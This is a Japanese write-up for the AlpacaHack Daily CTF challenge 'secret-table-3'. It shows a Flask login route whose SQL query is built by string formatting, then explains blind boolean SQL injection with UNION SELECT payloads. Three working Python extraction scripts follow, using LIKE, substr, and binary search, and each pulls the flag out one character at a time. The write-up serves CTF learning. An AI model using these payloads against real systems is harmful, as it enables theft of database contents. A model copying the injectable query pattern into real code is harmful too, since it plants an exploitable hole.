---
title: "secret-table-3 - AlpacaHack Daily"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "alpacahack", "sqli", "union-select", "secret-table-3", "web-exploitation"]
summary: "web writeup for \"secret-table-3\" from AlpacaHack Daily - techniques: alpacahack, sqli, union-select, secret-table-3, web-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d10_secret-table-3/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "secret-table-3"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** secret-table-3
- **Date:** 2026-07-10
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d10_secret-table-3>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d10_secret-table-3/README.md>

---
# secret-table-3

## 問題

脆弱性があるって？ まぁログインできたかしかわからなければ、フラグは漏れないよね…

```py
@app.post("/login")
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    conn = sqlite3.connect("database.db")
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )

    error = None
    try:
        user = conn.execute(query).fetchone()
    except sqlite3.Error as e:
        user = None
        error = str(e)
    conn.close()

    if error:
        return f"SQL error: {error}"

    if user is None:
        return "invalid credentials"

    return f"Hello, user!"
```

## 概要

ログインチェックのSELECT文作成にプレースホルダを使っていないので、SQLインジェクションできそうです。

フラグが別テーブルに置かれているケースは過去問にもありましたが、今回の問題ではSQLの実行結果が画面に一切表示されず、ログインが成功したか失敗したかしかわかりません。

この状況でフラグを特定するにはどうすればいいのでしょうか？

## 方針

ブラインドSQLインジェクションを使ってフラグを1文字ずつ特定していく。

## 解法

ブラインドSQLインジェクションは、SQL実行結果からわずかな情報しか得られない状況でもデータを盗み出す攻撃手法で、Oracle攻撃の一種です。

今回の問題のように何度でも試行できる場合においては、ログイン成功/失敗というわずかな情報を集めることで必要なデータを特定することができます。

例えば、
```
Username: alpaca
Password: ' union select 1,flag from secret where flag like 'A%
```
と入力したとすると、SELECT文は
```
SELECT * FROM users WHERE username='alpaca' AND password='' union select 1,flag from secret where flag like 'A%';
```
となります。

※usersテーブルのカラム数が2なので、ダミーの1を入れてカラム数を合わせています。

この場合、もしflagが`A`から始まる場合はログイン成功、`A`以外から始まる場合はログイン失敗となります。

これを文字を変えながら繰り返し、フラグを1文字ずつ特定していくことで、フラグ全体を得られると考えました。

これをもとに最初に私がやらかした「ダメな例」を紹介します。

```py
from requests import post

HOST, PORT = "localhost", 3000
# HOST, PORT = "34.170.146.252", 25744
URL = f"http://{HOST}:{PORT}/login"

def try_login(flag_part:str):
    data = {
        "username": "alpaca",
        "password": "' union select 1, flag from secret where flag like 'Alpaca{" + flag_part+ "%}"
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text

flag_part = ""
while True:
    print(f"{flag_part = }")
    for c in range(0x20, 0x7f):
        ch = chr(c)
        if ch == "'" or ch == "%":
            continue
        if try_login(flag_part + ch):
            flag_part += ch
            break
    else:
        break
flag = f"Alpaca{{{flag_part}}}"
print(f"{flag = }")
```
※7/12 {を重ねるとGithub Pagesでエラーが出るようなので修正しました。

まず、この方法の問題点として、フラグに`%`が含まれていたらうまくいきません。

この時点で考え直すべきでしたが、まあ`%`は含まれていないだろうと信じて進めました。

ローカル環境では、
```
flag_part = ''
flag_part = 'R'
flag_part = 'RE'
flag_part = 'RED'
flag_part = 'REDA'
flag_part = 'REDAC'
flag_part = 'REDACT'
flag_part = 'REDACTE'
flag_part = 'REDACTED'
flag = 'Alpaca{REDACTED}'
```
このように正しく求めることができました。

しかし、本番環境で実行すると、それっぽいフラグがでてきましたが、提出すると誤答になってしまいます。

あとでわかったのですが、この方法には`%`の他に2つの問題点がありました。
- likeは大文字/小文字を区別しないので、小文字の場合先に大文字でヒットしてしまう。
- `_`は任意の1文字にヒットするので、`0x5f`以降は全て`_`でヒットしてしまう。

というわけで、likeを使わずに1文字ずつピンポイントで見ていくことにしました。

```py
from requests import post

HOST, PORT = "localhost", 3000
# HOST, PORT = "34.170.146.252", 25744
URL = f"http://{HOST}:{PORT}/login"

def check_length(pos:int):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where length(flag) = {pos}; --"
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text

def check_char(pos:int, ch:str):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where substr(flag,{pos},1) = '{ch}"
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text

pos = 8
while True:
    print(f"{pos = }")
    if check_length(pos):
        break
    pos += 1
len_flag = pos

flag = "Alpaca{"
for pos in range(8, len_flag):
    print(f"{flag = }")
    for c in range(0x20, 0x7f):
        ch = chr(c)
        if ch == "'":
            continue
        if check_char(pos, ch):
            flag += ch
            break

flag += "}"
print(f"{flag = }")
```
まず文字数を特定し、8文字目から1文字ずつ位置をずらしながら照合していきます。

この方法であれば、フラグに小文字や`%`,`_`が含まれていても全く問題ありません。

## おまけ

二分探索を使って問い合わせ回数を減らす効率化をしてみました。

```py
from requests import post

HOST, PORT = "localhost", 3000
# HOST, PORT = "34.170.146.252", 25744
URL = f"http://{HOST}:{PORT}/login"

def check_length(pos:int):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where length(flag) > {pos}; --"
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text

def check_char(pos:int, ch:str):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where substr(flag,{pos},1) > '{ch}"
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text

low = 8
high = 128
while low < high:
    mid = (low + high) // 2
    print(f"{low = }, {mid = }, {high = }")
    if check_length(mid):
        low = mid + 1
    else:
        high = mid
len_flag = low

flag = "Alpaca{"
for pos in range(8, len_flag):
    print(f"{flag = }")
    low = 0x20
    high = 0x7e
    while low < high:
        mid = (low + high) // 2
        ch = chr(mid)
        if ch == "'":
            ch = "''"
        if check_char(pos, ch):
            low = mid + 1
        else:
            high = mid
    flag += chr(low)

flag += "}"
print(f"{flag = }")
```
